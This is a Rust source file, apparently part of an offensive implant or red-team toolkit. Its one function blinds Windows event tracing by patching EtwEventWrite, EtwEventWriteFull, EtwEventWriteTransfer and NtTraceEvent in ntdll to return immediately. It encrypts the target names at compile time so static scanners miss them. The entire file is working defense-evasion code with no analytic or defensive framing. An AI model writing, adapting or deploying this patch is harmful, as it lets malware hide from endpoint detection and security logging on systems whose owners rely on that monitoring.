/// ETW bypass — short-circuits every user-mode ETW entry point in ntdll:
///   EtwEventWrite, EtwEventWriteFull, EtwEventWriteTransfer, NtTraceEvent
///
/// Each is patched to `xor eax,eax; ret` (STATUS_SUCCESS / 0), so telemetry
/// events are silently dropped before they reach the kernel.
#[cfg(target_os = "windows")]
pub fn patch() {
    use windows_sys::Win32::System::LibraryLoader::{GetModuleHandleA, GetProcAddress};
    use windows_sys::Win32::System::Memory::{VirtualProtect, PAGE_EXECUTE_READWRITE};

    // xor eax,eax (31 C0) + ret (C3) — clears eax and returns STATUS_SUCCESS
    const STUB: [u8; 3] = [0x31, 0xC0, 0xC3];

    unsafe {
        let ntdll_n = { let mut v = oxide_macros::encrypt_str!("ntdll.dll").into_bytes(); v.push(0); v };
        let ntdll = GetModuleHandleA(ntdll_n.as_ptr() as _);
        if ntdll == 0 { return; }

        let fn_names = vec![
            oxide_macros::encrypt_str!("EtwEventWrite"),
            oxide_macros::encrypt_str!("EtwEventWriteFull"),
            oxide_macros::encrypt_str!("EtwEventWriteTransfer"),
            oxide_macros::encrypt_str!("NtTraceEvent"),
        ];

        for fn_name in &fn_names {
            let name_cstr: Vec<u8> = { let mut v = fn_name.clone().into_bytes(); v.push(0); v };
            let func = GetProcAddress(ntdll, name_cstr.as_ptr() as _);
            if func.is_none() { continue; }

            let addr = func.unwrap() as *mut u8;
            let mut old = 0u32;
            if VirtualProtect(addr as _, STUB.len(), PAGE_EXECUTE_READWRITE, &mut old) != 0 {
                std::ptr::copy_nonoverlapping(STUB.as_ptr(), addr, STUB.len());
                VirtualProtect(addr as _, STUB.len(), old, &mut old);
            }
        }
    }
}

#[cfg(not(target_os = "windows"))]
pub fn patch() {}
